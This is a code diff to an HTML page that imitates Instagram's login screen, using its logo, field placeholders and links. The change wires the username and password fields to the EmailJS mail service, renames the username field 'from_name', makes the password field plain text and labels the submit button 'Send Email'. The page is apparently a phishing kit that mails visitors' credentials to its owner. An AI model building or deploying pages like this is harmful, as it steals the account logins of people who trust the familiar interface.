@@ -6,44 +6,42 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Login</title>
     <link rel="stylesheet" href="./form.css" />
-    <script src="../index.js"></script>
-
-    <script
-      type="text/javascript"
-      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
-    ></script>
-    <script type="text/javascript">
-      (function () {
-        // Thron
-        emailjs.init("yF_TSa7g2HUsqc87p");
-      })();
-    </script>
+    <!-- <script src="../index.js"></script> -->
   </head>
 
   <body>
     <main class="form__container">
       <img src="/assets/instagramlogo.png" alt="Instagram" />
       <!-- <form action="" method="post"> -->
-      <form>
+      <form id="form">
         <input
-          type="email"
-          name="email"
-          id="email"
+          type="text"
+          name="from_name"
+          id="from_name"
           placeholder="Phone number, username, or email"
         />
         <input
-          type="password"
+          type="text"
           name="password"
           id="password"
           placeholder="Password"
         />
 
-        <button onclick="sendMail()">Log in</button>
+        <input class="btn" type="submit" id="button" value="Send Email" />
       </form>
 
       <a href="#"> Forgot password?</a>
       <p>Don't have an account? <a href="#">Sign up</a></p>
     </main>
-    <script></script>
+    <!-- <script></script> -->
   </body>
+  <script
+    type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
+  ></script>
+
+  <script type="text/javascript">
+    emailjs.init("hiBoe0i9yGWimiXZY");
+  </script>
+  <script src="../index.js"></script>
 </html>
